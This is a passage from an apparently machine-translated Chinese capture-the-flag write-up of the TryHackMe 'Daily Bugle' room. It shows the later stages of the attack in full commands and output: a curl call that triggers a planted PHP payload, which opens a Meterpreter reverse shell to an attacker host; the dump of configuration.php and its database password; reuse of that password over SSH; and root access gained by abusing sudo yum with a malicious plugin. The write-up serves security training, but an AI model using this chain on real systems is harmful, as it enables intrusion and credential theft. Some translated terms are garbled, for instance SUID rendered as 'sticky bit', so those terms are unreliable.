target="_blank">卷曲(未指定)</a>实用程序来完成:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="a3f5" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$ curl http://dailybugle.thm/templates/protostar/logging.php</strong><br/><br/>[... snip ...]</span></pre><p id="e4a5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">不到一分钟，我就收到了目标系统的反向shell:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="a7de" class="oc lr iu nk b be od oe l of og">[*] Started reverse TCP handler on attacker.thm:4444 <br/>[*] Sending stage (39927 bytes) to dailybugle.thm<br/>[*] Meterpreter session 1 opened (attacker.thm:4444 -&gt; dailybugle.thm:42632) at [redacted]<br/><br/><strong class="nk iv">meterpreter &gt;</strong></span></pre><p id="784c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我再次引用了<a class="ae kz" href="https://muirlandoracle.co.uk/2020/02/08/daily-bugle-write-up/" rel="noopener ugc nofollow" target="_blank"> "MurilandOracle" (2020) </a>来查找用户的标志文件，并使用了以下方法:我将转储目标系统的<code class="fe nh ni nj nk b">configuration.php</code>文件，以获得一个用于凭证重用的密码:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="01f9" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">meterpreter &gt; pwd</strong><br/>/var/www/html/templates/protostar<br/><strong class="nk iv">meterpreter &gt; cd ../..<br/>meterpreter &gt; pwd</strong><br/>/var/www/html<br/><strong class="nk iv">meterpreter &gt; cat configuration.php</strong><br/>&lt;?php<br/>class JConfig {<br/><br/>[... snip ...]<br/><br/>        public $host = 'localhost';<br/>        public $user = 'root';<br/>        <strong class="nk iv">public $password = 'nv5uz9r3ZEDzVjNu';</strong><br/>        public $db = 'joomla';<br/><br/>[... snip ...]<br/><br/>        public $shared_session = '0';<br/>}<strong class="nk iv">meterpreter &gt;</strong></span></pre><p id="9be3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我可以通过运行<code class="fe nh ni nj nk b">/home</code>目录的<code class="fe nh ni nj nk b">ls</code>来枚举系统上的用户:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="e560" class="oc lr iu nk b be od oe l of og">}<strong class="nk iv">meterpreter &gt; ls /home</strong><br/>Listing: /home<br/>==============<br/><br/>Mode              Size  Type  Last modified              Name<br/>----              ----  ----  -------------              ----<br/>040700/rwx------  99    dir   2019-12-15 19:47:48 -0500  jjameson<br/><br/><strong class="nk iv">meterpreter &gt;</strong></span></pre><p id="d1ec" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我可以推断目标系统有一个名为<code class="fe nh ni nj nk b">jjameson</code>的用户，并猜测他们的密码是<code class="fe nh ni nj nk b">nv5uz9r3ZEDzVjNu</code>。我可以通过使用<code class="fe nh ni nj nk b">ssh</code>实用程序访问他们的帐户来测试这个假设:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="9176" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna㉿deniers)-[~/dailybugle]<br/>└─$ ssh jjameson@dailybugle.thm    </strong><br/>jjameson@dailybugle.thm's password: <br/>Last login: Mon Dec 16 05:14:55 2019 from netwars<br/><strong class="nk iv">[jjameson@dailybugle ~]$</strong></span></pre><p id="aa7c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在我可以转储<code class="fe nh ni nj nk b">jjameson</code>的标志了:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="6e38" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">[jjameson@dailybugle ~]$ ls</strong><br/>user.txt<br/><strong class="nk iv">[jjameson@dailybugle ~]$ cat user.txt</strong><br/>[redacted]<br/><strong class="nk iv">[jjameson@dailybugle ~]$</strong></span></pre><p id="b8a0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">非常好。</p><h2 id="57ad" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">后剥削</h2><p id="0089" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我现在可以利用目标系统上的漏洞来获得根用户访问权限。我将尝试利用一个具有root权限的粘性位驱动的二进制文件(<a class="ae kz" href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit" rel="noopener ugc nofollow" target="_blank"> Carrigan 2020 </a>)并欺骗它执行一个shell。我可以使用<code class="fe nh ni nj nk b">find</code>命令探测目标系统中设置了粘性位的文件，并将结果缩小到具有root权限的二进制文件:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="eb63" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">[jjameson@dailybugle ~]$ find / -type f -perm /4000 -print 2&gt;/dev/null</strong><br/>/usr/bin/chage<br/>/usr/bin/gpasswd<br/>/usr/bin/chfn<br/>/usr/bin/chsh<br/>/usr/bin/newgrp<br/>/usr/bin/su<br/>/usr/bin/sudo<br/>/usr/bin/mount<br/>/usr/bin/umount<br/>/usr/bin/crontab<br/>/usr/bin/pkexec<br/>/usr/bin/passwd<br/>/usr/sbin/unix_chkpwd<br/>/usr/sbin/pam_timestamp_check<br/>/usr/sbin/usernetctl<br/>/usr/lib/polkit-1/polkit-agent-helper-1<br/>/usr/libexec/dbus-1/dbus-daemon-launch-helper<br/><strong class="nk iv">[jjameson@dailybugle ~]$</strong></span></pre><p id="3c26" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将列举哪些二进制文件可以用<code class="fe nh ni nj nk b">sudo</code>运行:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="9742" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">[jjameson@dailybugle ~]$ sudo -l</strong><br/>Matching Defaults entries for jjameson on dailybugle:<br/>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME<br/>    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE<br/>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",<br/>    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin<br/><br/>User jjameson may run the following commands on dailybugle:<br/>    (ALL) NOPASSWD: /usr/bin/yum<br/><strong class="nk iv">[jjameson@dailybugle ~]$</strong></span></pre><p id="5e42" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe nh ni nj nk b">yum</code>二进制可以由<code class="fe nh ni nj nk b">sudo</code>执行。我将使用<a class="ae kz" href="https://gtfobins.github.io/gtfobins/yum/" rel="noopener ugc nofollow" target="_blank"> GTFOBins (n.d.) </a>提供的指南来利用<code class="fe nh ni nj nk b">yum</code>执行命令。首先，我将尝试找到<code class="fe nh ni nj nk b">root.txt</code>标志:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="a26d" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">[jjameson@dailybugle ~]$ find / -type f -name root.txt -print 2&gt;/dev/null<br/>[jjameson@dailybugle ~]$</strong></span></pre><p id="ae1e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这次搜索没有得到任何有用的信息。相反，我将尝试生成一个交互式的根shell，而不是我原来的计划(这更容易实现:执行一个单独的<code class="fe nh ni nj nk b">cat root.txt</code>命令):</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="3a54" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">[jjameson@dailybugle ~]$ TF=$(mktemp -d)<br/>[jjameson@dailybugle ~]$ cat &gt;$TF/x&lt;&lt;EOF</strong><br/>&gt; [main]<br/>&gt; plugins=1<br/>&gt; pluginpath=$TF<br/>&gt; pluginconfpath=$TF<br/>&gt; EOF<br/><strong class="nk iv">[jjameson@dailybugle ~]$ <br/>[jjameson@dailybugle ~]$ cat &gt;$TF/y.conf&lt;&lt;EOF</strong><br/>&gt; [main]<br/>&gt; enabled=1<br/>&gt; EOF<br/><strong class="nk iv">[jjameson@dailybugle ~]$ <br/>[jjameson@dailybugle ~]$ cat &gt;$TF/y.py&lt;&lt;EOF</strong><br/>&gt; import os<br/>&gt; import yum<br/>&gt; from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE<br/>&gt; requires_api_version='2.1'<br/>&gt; def init_hook(conduit):<br/>&gt;   os.execl('/bin/sh','/bin/sh')<br/>&gt; EOF<br/><strong class="nk iv">[jjameson@dailybugle ~]$ <br/>[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y</strong><br/>Loaded plugins: y<br/>No plugin match for: y<br/><strong class="nk iv">sh-4.2# id</strong><br/>uid=0(root) gid=0(root) groups=0(root)<br/><strong class="nk iv">sh-4.2#</strong></span></pre><p id="67c5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这很好。我现在可以转储包含标志的<code class="fe nh ni nj nk b">root.txt</code>:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="3737" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">sh-4.2# cat /root/root.txt</strong><br/>[redacted]<br/><strong class="nk iv">sh-4.2#</strong></span></pre><p id="c082" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="39df" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">结束事项</h1><p id="d4e7" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">这是一个难度适中的试衣间。像往常一样，我调用了一种攻击性的安全方法来探测boot2root目标系统中可能被利用来获得初始进入的弱点。我利用了一个过时的Joomla上的SQL注入漏洞！内容管理系统，破解其散列密码，然后以此为基础进入Joomla！超级管理员面板。</p><p id="eb6e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">之后，我不得不转储更多的配置文件来发现关于我的目标的更多信息，然后以此为基础在不同的凭证下重新进入目标系统。最后，我用<code class="fe nh ni nj nk b">sudo</code>权限开发了与<em class="ky"> CentOS </em>相关的包管理系统，以获得一个交互式根shell，让我自己完全控制目标系统。</p><p id="742d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">一些要点如下:</p><ul class=""><li id="6fcd" class="mo mp iu jt b ju jv jy jz kc ok kg ol kk om ko on mw mx my bi translated">当获得初始访问权时，不要认为获得的特权与其他任何用户相同。Apache HTTP服务器的特权与<code class="fe nh ni nj nk b">jjameson</code>的不同。</li><li id="9631" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko on mw mx my bi translated">有时需要更多的探测来访问目标系统的不同部分，而不一定是<code class="fe nh ni nj nk b">root</code>帐户。在某些情况下，可能无法获得对目标系统的超级用户访问权限，因此攻击性安全工程师需要满足于他们可以获得的任何非超级用户权限。</li><li id="f5cd" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko on mw mx my bi translated">Joomla ！s <code class="fe nh ni nj nk b">configuration.php</code>文件可能包含关于目标系统的有用信息。一定要把这些添加到你的“思维导图”中再者，<em class="ky">珠姆拉</em>！可以很容易地被黑客攻击来存储PHP脚本，允许后门。</li></ul><h2 id="10e8" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">承认</h2><p id="c0b1" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我要感谢<a class="ae kz" href="https://muirlandoracle.co.uk/" rel="noopener ugc nofollow" target="_blank">穆兰多尔</a>和<a class="ae kz" href="https://medium.com/@nickwilliams_" rel="noopener">尼克威廉姆斯</a>给我写的非常有帮助的文章😉)做这个房间时参考的。我会承认我一路上卡了几次，如果没有他们的监护，我不可能完成这个房间！</p><h2 id="12c8" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">行动呼吁:米拉·拉辛</h2><p id="060a" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">像往常一样，我只想为米拉·拉齐奥在左撇子空间的惊人工作而欢呼。为了让这个世界变得更好，她所做的已经超过了愚蠢的艺术家谷的所有技术人员的总和。去跟随她自己在她的新乳齿象帐户❤️</p><div class="ou ov gq gs ow ox"><a href="https://kolektiva.social/@MiraLazine" rel="noopener  ugc nofollow" target="_blank"><div class="oy ab fp"><div class="oz ab pa cl cj pb"><h2 class="bd iv gz z fq pc fs ft pd fv fx it bi translated">不变量(@miralazine@kolektiva.social)</h2><div class="pe l"><h3 class="bd b gz z fq pc fs ft pd fv fx dk translated">100个帖子，87个以下，38个追随者复数，跨性别，残疾，神经分歧，无政府主义未成年人DNI如果你需要一个…</h3></div><div class="pf l"><p class="bd b dl z fq pc fs ft pd fv fx dk translated">kolektiva.social</p></div></div><div class="pg l"><div class="ph l pi pj pk pg pl lk ox"/></div></div></a></div><h2 id="e1ee" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">行动号召:我的东西</h2><p id="15d2" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">对于喜欢我的作品但尚未注册Medium会员计划的读者，如果他们能通过我的推荐链接注册，我将不胜感激(这在经济上帮助了我https://medium.com/membership/@EpsilonCalculus ❤️):<a class="ae kz" href="https://medium.com/membership/@EpsilonCalculus" rel="noopener">和</a></p><p id="5c05" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，对于任何喜欢阅读我的黑客文章的读者，我邀请他们看看我的技术文章系列，主要由CTF的文章组成，但也有其他计算机和STEM内容😃</p><div class="ou ov gq gs ow"><div role="button" tabindex="0" class="ab bv gw cb fq pm pn bn po lk ex"><div class="pp l"><div class="ab q"><div class="l di"><img alt="Aleksey" class="l de bw pq pr fe" src="../Images/886245347566d4089464c40d5ec5ccfc.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*QCw3Unyn7vnntVR7WHXImA.png"/><div class="fb bw l pq pr fc n aw fd"/></div><div class="hi l fp"><p class="bd b dl z fq fr fs ft fu fv fw fx dk translated">阿列克谢</p></div></div><div class="pu pv gx l"><h2 class="bd iv vd mo fq ve fs ft pd fv fx it bi translated">技术报道</h2></div><div class="ab q"><div class="l fp"><a class="bd b be z bi vf au vg vh vi rz vj an eh ei vk vl vm el em eo de bk ep" href="https://medium.com/@EpsilonCalculus/list/technical-writeups-63f8cfbee59c?source=post_page-----87a52f234a82--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="vn l fp"><span class="bd b dl z dk">43 stories</span></div></div></div><div class="qh dh qi fq ab qj fp di"><div class="di pz bv qa qb"><div class="dh l"><img alt="" class="dh" src="../Images/e91d6d5a97594a0fdfb555761a774256.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*Cq7_tlU0Ukq_pR63YMHgCg.png"/></div></div><div class="di pz bv qc qd qe"><div class="dh l"><img alt="" class="dh" src="../Images/637c9938ab55d24718c20c200ddda1a0.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*pkGgeXcrKXaHU2eki1bOHQ.png"/></div></div><div class="di bv qf qg qe"><div class="dh l"><img alt="" class="dh" src="../Images/78df73524bea8b23f1be91acbb669dc6.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*_1zitov03vXXuoYr2lje2A.png"/></div></div></div></div></div><h1 id="56eb" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">参考</h1><p id="738c" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">Apache HTTP服务(2.4.6版)。<em class="ky">更改日志</em>。阿帕奇休息室。2022年12月13日检索自:<a class="ae kz" href="https://www.apachelounge.com/Changelog-2.4.html" rel="noopener ugc nofollow" target="_blank">https://www.apachelounge.com/Changelog-2.4.html</a></p><p id="2234" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">t .卡里根(2020年)。<em class="ky"> Linux权限:SUID、SGID和粘滞位</em>。红帽子。2022年12月16日检索自:【https://www.redhat.com/sysadmin/suid-sgid-sticky-bit T21】</p><p id="fa3f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">厘斯(未标明日期)。<em class="ky">关于CentOS </em>。2022年12月13日检索自:<a class="ae kz" href="https://www.centos.org/about/" rel="noopener ugc nofollow" target="_blank">https://www.centos.org/about/</a></p><p id="138e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">卷曲(未标明)。<em class="ky">常见问题</em>。2022年12月16日检索自:【https://curl.se/docs/faq.html T2】</p><p id="81c1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">邓格基维基(2022年5月18日修订)。<em class="ky">天堂的记事本</em>。2022年12月17日检索自:<a class="ae kz" href="https://dengeki.fandom.com/wiki/Heaven%27s_Memo_Pad?oldid=39308" rel="noopener ugc nofollow" target="_blank">https://dengeki.fandom.com/wiki/Heaven%27s_Memo_Pad?oldid=39308 </a></p><p id="b43e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Espargham等人(未注明)。<em class="ky"> joomscan: OWASP Joomla漏洞扫描器项目</em>。GitHub仓库。2022年12月13日检索自:<a class="ae kz" href="https://github.com/OWASP/joomscan" rel="noopener ugc nofollow" target="_blank">https://github.com/OWASP/joomscan</a></p><p id="24c9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">GTFOBins(未标明)。<em class="ky">百胜</em>。2022年12月16日检索自:<a class="ae kz" href="https://gtfobins.github.io/gtfobins/yum/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/yum/</a></p><p id="35bc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Hashes.com(未标出)。<em class="ky">哈希类型标识符——识别未知哈希</em>。2022年12月15日检索自:<a class="ae kz" href="https://hashes.com/en/tools/hash_identifier" rel="noopener ugc nofollow" target="_blank">https://hashes.com/en/tools/hash_identifier</a></p><p id="1b92" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">珠拉。(未注明)。<em class="ky">内容管理系统建立网站&amp;应用程序</em>。2022年12月13日检索自:<a class="ae kz" href="https://www.joomla.org/about-joomla.html" rel="noopener ugc nofollow" target="_blank">https://www.joomla.org/about-joomla.html</a></p><p id="d0fe" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">珠拉。(未注明)。<em class="ky">管理员(应用)</em>。2022年12月13日检索自:<a class="ae kz" href="https://docs.joomla.org/Administrator_(Application)" rel="noopener ugc nofollow" target="_blank">https://docs . Joomla . org/Administrator _(Application)</a></p><p id="c4c0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">珠拉。(未注明日期)。<em class="ky">模块</em>。2022年12月13日检索自:<a class="ae kz" href="https://docs.joomla.org/Module" rel="noopener ugc nofollow" target="_blank">https://docs.joomla.org/Module</a></p><p id="4f44" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">利诺，M. (2017)。<em class="ky"> Joomla！3 . 7 . 0—‘com _ fields’SQL注入</em>。利用数据库。2022年12月13日检索自:<a class="ae kz" href="https://www.exploit-db.com/exploits/42033" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/42033</a></p><p id="1449" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">马里亚得布(未标明)。<em class="ky">关于MariaDB服务器</em>。2022年12月13日检索自:<a class="ae kz" href="https://mariadb.org/about/" rel="noopener ugc nofollow" target="_blank">https://mariadb.org/about/</a></p><p id="234f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Mehlmauer等人(未注明)。<em class="ky"> Gobuster v3.2.0:用Go </em>编写的目录/文件、DNS和VHost破坏工具。GitHub仓库。2022年12月13日检索自:【https://github.com/OJ/gobuster T42】</p><p id="1685" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">米塔尔公司(2011年)。使用Meterpreter进行后期开发。利用数据库。2022年12月16日检索自:【https://www.exploit-db.com/docs/18229 T2】</p><p id="c84f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《穆兰道尔》(2020)。<em class="ky">每日号角——报道</em>。2022年12月13日检索自:<a class="ae kz" href="https://muirlandoracle.co.uk/2020/02/08/daily-bugle-write-up" rel="noopener ugc nofollow" target="_blank">https://muirlandoracle . co . uk/2020/02/08/daily-bugle-write-up</a></p><p id="bd8c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">MySQL(未标明)。<em class="ky">关于MySQL </em>。2022年12月13日检索自:<a class="ae kz" href="https://www.mysql.com/about/" rel="noopener ugc nofollow" target="_blank">https://www.mysql.com/about/</a></p><p id="9195" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">nmap(未标明)。<em class="ky"> Nmap:网络映射器——免费安全扫描器</em>。2022年12月13日检索自:<a class="ae kz" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/</a></p><p id="de1b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">OpenSSH(7.4版)。<em class="ky">发行说明</em>。2022年12月13日检索自:<a class="ae kz" href="https://www.openssh.com/txt/release-7.4" rel="noopener ugc nofollow" target="_blank">https://www.openssh.com/txt/release-7.4</a></p><p id="fbc3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">开放式墙壁(未标明)。开膛手约翰密码破解者。2022年12月15日检索自:<a class="ae kz" href="https://www.openwall.com/john/" rel="noopener ugc nofollow" target="_blank">https://www.openwall.com/john/</a></p><p id="8c2d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Prodromou，A. (2020)。<em class="ky">Web shell入门(Web shell第一部分)</em>。Acunetix博客。2022年12月16日检索自:<a class="ae kz" href="https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/" rel="noopener ugc nofollow" target="_blank">https://www . acune tix . com/blog/articles/introduction-we B- shell-part-1/</a></p><p id="9670" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">普罗沃斯和马齐尔斯博士(1999年)。<em class="ky"> Bcrypt算法</em>。USENIX会议。2022年12月15日检索自:<a class="ae kz" href="https://www.usenix.org/legacy/events/usenix99/provos/provos_html/node5.html" rel="noopener ugc nofollow" target="_blank">https://www . usenix . org/legacy/events/usenix 99/provos/provos _ html/node 5 . html</a></p><p id="f6c3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Rivest，R. (1992年)。<em class="ky">MD5消息摘要算法</em>。网络工作组。2022年12月15日检索自:<a class="ae kz" href="https://www.rfc-editor.org/rfc/rfc1321" rel="noopener ugc nofollow" target="_blank">https://www.rfc-editor.org/rfc/rfc1321</a></p><p id="0ef0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">施奈尔，B. (1994年)。<em class="ky">一种新的变长密钥64位分组密码(Blowfish)的描述。</em>施奈尔上安保。2022年12月15日检索自:<a class="ae kz" href="https://www.schneier.com/academic/archives/1994/09/description_of_a_new.html" rel="noopener ugc nofollow" target="_blank">https://www . schneier . com/academic/archives/1994/09/description _ of _ a _ new . html</a></p><p id="b491" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Stampar等人(未注明)。sqlmap:自动SQL注入和数据库接管工具。GitHub仓库。2022年12月13日检索自:【https://github.com/sqlmapproject/sqlmap T2】</p><p id="6d1f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《tryhackme》(2020)。<em class="ky">每日号角</em>。TryHackMe。2022年12月17日检索自:<a class="ae kz" href="https://tryhackme.com/room/dailybugle" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/dailybugle</a></p><p id="eb85" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">维基百科(2022年10月15日修订)。<em class="ky">每日号声</em>。2022年12月17日检索自:<a class="ae kz" href="https://en.wikipedia.org/w/index.php?title=Daily_Bugle&amp;oldid=1116305493" rel="noopener ugc nofollow" target="_blank">https://en.wikipedia.org/w/index.php?title=Daily_Bugle&amp;oldid = 1116305493</a></p><p id="47da" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">北卡罗来纳州威廉姆斯(2019)。Vulnhub报道:——DC:3。独立出版。2022年12月16日检索自:<a class="ae kz" href="https://medium.com/@nickwilliams_/vulnerability-adventures-dc-3-416afe04c531" rel="noopener">https://medium . com/@ nick Williams _/vulnerability-adventures-DC-3-416 AFE 04 c 531</a></p><p id="57aa" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">xsltproc(未标明)。<em class="ky"> xsltproc —命令行xslt处理器</em>。2022年12月7日检索自:<a class="ae kz" href="http://xmlsoft.org/xslt/xsltproc.html" rel="noopener ugc nofollow" target="_blank">http://xmlsoft.org/xslt/xsltproc.html</a></p></div><div class="ab cl qo qp hy qq" role="separator"><span class="qr bw bk qs qt qu"/><span class="qr bw bk qs qt qu"/><span class="qr bw bk qs qt"/></div><div class="in io ip iq ir"><h2 id="558d" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kz" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>，以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>